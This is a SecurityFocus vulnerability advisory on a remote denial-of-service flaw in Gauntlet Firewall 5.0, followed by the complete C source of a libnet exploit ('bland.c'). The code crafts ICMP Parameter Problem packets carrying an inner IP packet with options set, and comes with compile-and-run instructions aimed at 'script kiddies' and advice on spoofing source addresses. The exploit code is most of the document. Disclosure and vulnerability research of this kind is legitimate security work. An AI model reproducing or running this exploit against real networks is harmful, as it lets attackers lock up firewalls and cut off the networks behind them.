source: http://www.securityfocus.com/bid/556/info

There is a vulnerability in Gauntlet Firewall 5.0 which allows an attacker to remotely cause a denial of service. The vulnerability occurs because Gauntlet Firewall cannot handle a condition where an ICMP Protocol Problem packet's (ICMP_PARAMPROB) encapsulated IP packet has a random protocol field and certain IP options set. When this specially constructed packet ( [ICMP PARAMPROB][IP with random protocol code and some ip options] ) is sent THROUGH the Gauntlet Firewall (not to the firewall itself), the firewall will hang, looking for the packet in it's transparency tables.

The packet structure looks like this:

Begin Packet
------------------------------------------
[NORMAL IP HEADER]

[ICMP PARAMPROB HEADER]

-- encapsulated ip packet --

[IP HEADER]

(important fields in ip header)

ip_p = 98 (let's specify a protocol that doesn't exist)
ip_hl = 0xf (stuff options)


------------------------------------------
End Packet

An attacker would do the following:

Construct the [ip-icmp-ip] packet using a raw socket (SOCK_RAW) with the fields set accordingly, destination set to any machine behind the firewall.

Send the packet(s).

The number of packets that need to be sent depends on the platform (ie Sol on a Sparc vs BSDI).

The consequence of this vulnerability being exploited is the target Gauntlet 5.0 firewall being remotely locked up. It should be expected that an attacker would send packets with spoofed source addresses in the ip header making it difficult to trace. 

/*
 * Discovered and written by:  <godot@msg.net>          <- Send money to :-)
 *     aka     Mike Frantzen   <frantzen@expert.cc.purdue.edu>  <- Reply to
 *
 * Network Associates:  "Who's watching your network?"
 * MSG.net              "Who's watching the watchers?"
 *
 * This can be found online at http://www.msg.net/firewalls/tis/bland.c
 *
 * Description:
 *  If you know an IP that will be routed through a Gauntlet 5.0 Firewall,
 *  you can remotely lock up the firewall (tested against Solaris 2.6 and
 *  BSDI).  It locks up to the point that one packet will disable STOP-A
 *  (L1-A) on Sparcs and ~3-5 packets will disable Ctrl-Alt-Del on BSDI
 *  (Ctrl-Alt-Del still prompts Y/N but it never reboots).
 *
 *  **You can NOT send this to the Gauntlet's IP.  The packet must be one
 *  **that would go through the forwarding code.
 *
 *  If you are on local ether to the firewall, set it as your default route
 *  or otherwise send the packet to the firewall's MAC. 
 *
 *  The packet is parsed before the packet filtering rules in Gauntlet.  So
 *  the only known work-around is to ACL out ICMP type 12 at your screening
 *  router.
 *  Or you could switch to Gauntlet 5.5 which (in the beta) does not seem to
 *  be vulnerable -- but 5.5 introduces some new 'issues'.
 *
 *
 * Technical Description of the packet:
 *  The packet is an ICMP Paramater Problem packet that encapsulates an IP
 *  packet with IP Options.  There is a random protocol in the encapsulated
 *  IP packet.  The trick is:  the inner packet MUST have IP Options.  Some
 *  options work, some don't.
 *  The firewall apparently is looking for the packet (or an entry in its
 *  transparency table) that matches the encapsulated packet.  It just keeps
 *  looking....  It likely has interrupts masked off on Solaris.
 *
 * 
 * You need libnet to link this against.  It's a pretty spiffy lib.
 *   http://www.infonexus.com/~daemon9/Projects/Libnet
 *   http://www.packetfactory.net/libnet
 * 
 *
 * For da script kiddies:
 *   Compile with 'gcc -o bland bland.c -lnet'
 *   ./bland -d <ip through the firewall>
 *   (Did you remember to install Libnet???)
 *
 *
 * If it doesn't compile on your machine:  I DON'T CARE!!!  This program was
 * a quick and dirty hack.  You try reading a hexdump of a packet off the
 * wire and writing something that can reproduce it.
 * I know it compiles and works from FreeBSD 3.1 
 *
 *
 * Network Associates (TIS) was notified two weeks ago and they are working
 * on a patch.
 *
 *
 * Plugs:
 *  ISIC --  Program I used (and wrote) to find bugs in Gauntlet's IP stack.
 *           http://expert.cc.purdue.edu/~frantzen/isic-0.02.tar.gz
 *  Libnet --  Was able to write the basic exploit in 20 minutes because of
 *           libnet.  See libnet link above.  Thanks go out to Route!
 *
 *
 * Credits:
 *  Mike Frantzen <frantzen@expert.cc.purdue.edu>	Hey, thats me!
 *  Mike Scher <strange@cultural.com>
 *  Kevin Kadow <kadokev@msg.net>	      <-  Gauntlet Random Seed Hole
 *  Lenard Lynch <llynch@tribune.com>
 *  Viki Navratilova <vn@msg.net>
 */

#include <libnet.h>

int main(int argc, char **argv)
{
	u_long src_ip = 0, dst_ip = 0, ins_src_ip = 0, ins_dst_ip = 0;
	u_long *problem = NULL;
	u_char *packet = NULL;
	int sock, c, len = 0;
	long acx, count = 1;
	struct icmp *icmp;
	struct ip *ip;

	/* It appears that most IP options of length >0 will work
	 * Works with 128, 64, 32, 16...  And the normal ones 137... 
	 * Does not work with 0, 1 */
	u_char data[] = {137};
	int data_len = sizeof(data);

	printf("Written by Mike Frantzen...  <godot@msg.net>\n");
	printf("For test purposes only... yada yada yada...\n");

	src_ip = inet_addr("10.10.10.10");

	while ( (c = getopt(argc, argv, "d:s:D:S:l:c:")) != EOF ) {
	  switch(c) {
		case 'd':	dst_ip = libnet_name_resolve(optarg, 1);
				break;
		case 's':	src_ip = libnet_name_resolve(optarg, 1);
				break;
		case 'D':	ins_dst_ip = name_resolve(optarg, 1);
				break;
		case 'S':	ins_src_ip = name_resolve(optarg, 1);
				break;
		case 'l':	data_len = atoi(optarg);
				break;
		case 'c':	if ( (count = atol(optarg)) < 1)
					count = 1;
				break;
		default:	printf("Don't understand option.\n");
				exit(-1);
	  }
	}

	if ( dst_ip == 0 ) {
	    printf("Usage: %s\t -d <destination IP>\t[-s <source IP>]\n",
		rindex(argv[0], '/') == NULL ? argv[0]
					: rindex(argv[0], '/') + 1);
	    printf("\t\t[-S <inner source IP>]\t[-D <inner dest IP>]\n");
	    printf("\t\t[-l <data length>]\t[-c <# to send>]\n");
	    exit(-1);
	}

	if ( ins_dst_ip == 0 )
		ins_dst_ip = src_ip;
	if ( ins_src_ip == 0 )
		ins_src_ip = dst_ip;

	if ( (packet = malloc(1500)) == NULL ) {
		perror("malloc: ");
		exit(-1);
	}
	if ( (sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1 ) {
        	perror("socket: ");
        	exit(-1);
	}

	/* 8 is the length of the ICMP header with the problem field */
	len = 8 + IP_H + data_len;
	bzero(packet + IP_H, len);

        libnet_build_ip(len,                    /* Size of the payload */
                0xc2,                           /* IP tos */
                30241,                          /* IP ID */
                0,                              /* Frag Offset & Flags */
                64,                             /* TTL */
                IPPROTO_ICMP,                   /* Transport protocol */
                src_ip,                         /* Source IP */
                dst_ip,                         /* Destination IP */
                NULL,                           /* Pointer to payload */
                0,
                packet);                        /* Packet memory */


	/* ICMP Header for Parameter Problem
	 * --------------+---------------+---------------+---------------
	 *| Type (12)	 |    Code (0)	 |	Checksum		 |
	 * --------------+---------------+---------------+---------------
	 *| Pointer	 |		unused				 |
	 * --------------+---------------+---------------+---------------
	 * Internet Header + 64 bits of original datagram data....
	 */

	icmp = (struct icmp *) (packet + IP_H);
	problem = (u_long *) (packet + IP_H + 4);  /* 4 = ICMP header  */
	icmp->icmp_type	= ICMP_PARAMPROB;
	icmp->icmp_code	= 0;		/* Indicates a problem pointer */
	*problem = htonl(0x14000000);	/* Problem is 20 bytes into it */


	/* Need to embed an IP packet within the ICMP */
	ip = (struct ip *) (packet + IP_H + 8);	/* 8 = icmp header	*/
	ip->ip_v	= 0x4;			/* IPV4			*/
	ip->ip_hl	= 0xf;			/* Some IP Options	*/
	ip->ip_tos	= 0xa3;			/* Whatever		*/
	ip->ip_len	= htons(data_len);	/* Length of packet	*/
	ip->ip_id	= 30241;		/* Whatever		*/
	ip->ip_off	= 0;			/* No frag's		*/
	ip->ip_ttl	= 32;			/* Whatever		*/
	ip->ip_p	= 98;			/* Random protocol	*/
	ip->ip_sum	= 0;			/* Will calc later	*/
	ip->ip_src.s_addr = ins_src_ip;
	ip->ip_dst.s_addr = ins_dst_ip;

	/* Move our data block into the packet */
	bcopy(data, (void *) (packet + IP_H + IP_H + 8), data_len);

	/* I hate checksuming.  Spent a day trying to get it to work in
	 * perl...  That sucked...  Tequilla would have helped immensly.
	 */
	libnet_do_checksum((unsigned char *) ip, IPPROTO_IP, data_len);

	/* Bah...  See above comment.... */
	libnet_do_checksum(packet, IPPROTO_ICMP, len);


	printf("Sending %li packets", count);
	for (acx = 0; acx < count; acx++) {
	   if( libnet_write_ip(sock, packet, len + IP_H)  < (len + IP_H))
 		perror("write_ip: ");
	   else printf(".");
	}
	printf("\n\n");
	return( 0 );
}

